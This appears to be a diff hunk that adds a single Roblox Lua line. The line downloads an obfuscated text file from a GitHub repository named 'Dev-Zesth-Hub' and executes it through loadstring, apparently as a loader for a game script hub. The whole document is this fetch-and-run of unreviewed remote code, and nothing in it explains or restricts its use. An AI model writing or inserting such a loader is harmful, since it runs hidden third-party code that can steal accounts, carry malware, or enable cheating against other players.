@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SEAFH/Dev-Zesth-Hub/9b5db7b7ff21febdd518234442045e8cdcdb8703/obfuscated_code%20(2).txt"))()
